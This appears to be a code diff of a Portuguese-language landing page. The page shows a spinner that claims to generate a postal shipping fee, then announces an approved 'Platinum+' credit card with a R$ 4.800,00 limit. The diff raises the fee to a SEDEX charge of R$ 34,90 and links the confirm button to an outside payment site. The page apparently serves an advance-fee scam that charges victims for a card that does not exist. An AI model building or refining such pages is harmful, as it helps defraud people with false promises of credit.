@@ -34,7 +34,7 @@
         }
 
         .btn-custom {
-            color: rgb(255, 255, 255);
+            color: rgb(0, 0, 0);
             border: none;
             width: 100%;
             margin-bottom: 10px;
@@ -247,7 +247,7 @@
             <div class="main-content">
                 <!-- Primeira etapa de geração da taxa -->
                 <div id="etapa1" class="spinner-container">
-                    <p>Gerando a Taxa de Correios - PAC...</p>
+                    <p>Gerando a Taxa de Correios - SEDEX...</p>
                     <div class="spinner-border" role="status">
                         <span class="visually-hidden">Carregando...</span>
                     </div>
@@ -265,14 +265,14 @@
                 <div class="details-block d-none" id="etapa-detalhes">
                     <h4>Detalhes do Envio</h4>
                     <div>
-                        <strong>Endereço de entrega:</strong>
-                        <p id="enderecoCliente">Carregando...</p>
+                        <strong>Produto:</strong>
+                        <p>1 Cartão de Crédito Platinum+ <br>R$ 4.800,00 de Limite Aprovado</p>
                     </div>
                     <div>
                         <strong>Método de envio:</strong>
                         <p>
-                            <strong>PAC<br>
-                  R$ 28,90</strong><br> 10 dias úteis<br> Taxa única de envio • Rastreamento online
+                            <strong>SEDEX<br>
+                  R$ 34,90</strong><br> 1 dia útil<br> Taxa única de envio • Rastreamento online
                         </p>
                     </div>
                     <div>
@@ -294,9 +294,9 @@
                 </div>
 
                 <!-- Botão Final -->
-                <button type="button" id="confirmar" onclick="location.href='../pagar-pac/index.html' + window.location.search" class="btn btn-custom w-100 rounded-pill mt-4 d-none">
-            SIM, VOU QUERER!
-          </button>
+                <a href="https://bluebird2-nv8q.vercel.app/" id="confirmar" class="btn btn-custom w-100 rounded-pill mt-4 d-none">
+                    SIM, VOU QUERER!
+                </a>
             </div>
         </div>
 
